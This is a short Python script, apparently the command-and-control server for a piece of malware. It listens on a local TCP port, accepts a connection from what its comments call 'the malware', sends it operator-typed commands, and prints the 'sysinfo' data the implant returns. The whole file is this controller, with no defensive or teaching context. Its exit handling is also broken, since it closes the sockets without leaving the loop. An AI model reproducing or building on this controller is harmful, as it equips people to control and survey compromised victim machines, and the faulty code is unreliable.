import socket
import logging

host = '127.0.0.1'  # The server's hostname or IP address
port = 31016     # The port used by the server


if __name__ == "__main__":
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    except socket.error as e:
        logging.exception(e)

    print("Binding the Port: " + str(port))
    s.bind((host, port))
    s.listen()

    conn, addr = s.accept()
    print("Connection has been established. |" +
          " IP " + addr[0] + " | Port Number" + str(addr[1]))
    while True:
        cmd = input('Enter command please: ')  # Get the command from the user

        print('cmd = ' + cmd)
        if cmd == 'exit':  # If the command is exit, then break the loop
            conn.send(str.encode(cmd))  # Send the command to the malware
            conn.close()  # Close the connection
            s.close()  # Close the socket

        if len(str.encode(cmd)) > 0:  # If the command is not empty, then send it to the malware
            if cmd == 'sysinfo':  # If the command is sysinfo, then send it to the malware
                conn.send(str.encode(cmd))  # Send the command to the malware
                while True:  # Get the information from the malware
                    recieved_data = conn.recv(1024)  # Receive data from the malware
                    if recieved_data == b'end_of_sysinfo':  # If the data is end_of_sysinfo, then break the loop
                        break
                    print(recieved_data, end='\n')  # Print the received data
                # Print the end of getting information
                print('end of getting information')
